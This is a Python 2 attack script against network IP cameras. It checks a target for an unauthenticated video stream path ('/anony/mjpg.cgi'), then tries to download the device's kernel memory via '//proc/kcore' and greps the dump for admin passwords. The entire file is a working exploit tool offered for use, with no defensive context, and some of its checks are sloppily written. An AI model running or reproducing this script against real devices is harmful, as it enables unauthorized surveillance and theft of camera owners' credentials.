#!/usr/bin/env python
#-*- coding: utf-8 -*-

import requests
import urllib, urllib2
import os, sys

url = sys.argv[1]

def dlProgress(count, blockSize, totalSize):
      percent = int(count*blockSize*100/totalSize)
      sys.stdout.write("%2d%%" % percent)
      sys.stdout.write("\b\b\b")
      sys.stdout.flush()
      if percent == 25:
      	print "file download.\n"
      	print "\033[34m-\033[0m" * 30 + "\n"
      	print "search password..."
      	print "\033[34m-\033[0m" * 30 + "\n"
      	os.system('strings data_two.txt | grep -i admin -A3')
      	sys.exit()



def exploit_two():
	data_two = "data_two.txt"

	payload_two = "//proc/kcore"
	exploit2 = url + payload_two
	req = requests.get(url, allow_redirects=True)
	response = req.text
	if stat == 200 and "not found" not in response:
		print exploit2
		print "\033[32m[+] \033[0m exploit FOUND \n"
		print "exploit running..."
		dl = urllib.urlretrieve(exploit2, filename=data_two, reporthook=dlProgress)
	else:
		print "\033[33m[-] \033[0m exploit NOT"
		print "\033[34m-\033[0m" * 30 + "\n"

def exploit_one():
	payload = "/anony/mjpg.cgi"
	exploit1 = url + payload
	print exploit1
	req = requests.get(exploit1)
	response = req.text
	if stat == 200 and "not found" not in response:
		print "\033[32m[+] \033[0m exploit " + exploit1 + " OK !"
		resp = raw_input("test exploit n2 ? (y:n) : ")
		if resp == "y":
			exploit_two()
		else:
			sys.exit()
	else:
		print "\033[31m[-] \033[0m exploit NOT \n"
		print "\033[34m-\033[0m" * 30 + "\n"
		print "try to exploit 2....\n"
		exploit_two()

req = requests.get(url, allow_redirects=True)
stat  = req.status_code
if stat == 200:
	print "\033[42m [+] " + url + " CAM FOUND \033[0m"
	print "try to exploit type 'anony' : \n"
	exploit_one()

else:
	print "\033[41m [-] CAM NOT FOUND \033[0m"

